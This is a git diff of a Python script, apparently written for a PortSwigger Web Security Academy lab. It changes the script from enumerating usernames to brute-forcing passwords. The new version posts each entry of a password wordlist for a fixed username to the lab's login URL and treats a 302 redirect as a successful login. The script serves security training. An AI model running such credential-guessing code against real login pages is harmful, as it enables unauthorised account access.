@@ -14,9 +14,9 @@ from bs4 import BeautifulSoup
 # </form>
 # </section>
 
-# Login URL !!!
-url = 'https://0aa500d804e3f93f80cef34e00180053.web-security-academy.net/login'
-wordlistPath = './user.txt'
+url = 'https://0a6c000d04547c658131c504001300d7.web-security-academy.net/login'
+wordlistPath = './password.txt'
+
 
 #----------------------------------------------------------------
 
@@ -32,33 +32,44 @@ def readUserToList(wordlistPath):
     except FileNotFoundError:
         print("Wordlist Not Found", wordlistPath)
 
-userlist = readUserToList(wordlistPath)
-print("Testing User -> " , userlist)
-
+passwordList = readUserToList(wordlistPath)
+print("Testing User -> " , passwordList)
 
 #----------------------------------------------------------------
 
 # Test with a valid username and password
 index = 0
-for user in userlist:
+
+for password in passwordList:
 
     payload = {
-        'username':user,
-        'password':'EeeorPasswords'
+        'username':'ec2-user',
+        'password':password
     }
 
-    response = requests.post(url,payload)
+    response = requests.post(url,payload,allow_redirects=False) #Notice: In default request will automatically redirect !
+
+    #Check If login is successful!
+    if (response.status_code == 302):
+        print("Redirected to:", response.headers['Location'])
+        print("May Login Scussfully! Password is:", password)
+        sys.exit()
+    
+    
     soupParser = BeautifulSoup(response.text,'html.parser')
-
     grepExtract = soupParser.find('p',class_='is-warning')
-    if grepExtract is not None:
-        if (grepExtract.text != 'Invalid username'):
-            print("Valid Username found! UserName is:",user,"Grep->",grepExtract.text)
-            sys.exit()
-        else:
-            print("Attempt req:", index, "Grep->",grepExtract.text,user)
-    else:
-        print("May URL is Wrong! or Tags is Worng!, Please try again!")
-    index = index + 1
 
+    if grepExtract is not None:
+        if (grepExtract.text != 'Incorrect password'):
+            print("Valid Password Found!",index,"Grep->",grepExtract.text,password)
+        else:
+            print("Attempt req:", index, "Grep->",grepExtract.text,password)
+    else:
+        print("Warning tag not found")
+        print("checkt Http response:",response.status_code)
+        if (response.status_code == 302):
+            print("Redirected to:", response.headers['Location'])
+            print("May Login Scussfully! Password is:", password)
+    index = index + 1
+    
 
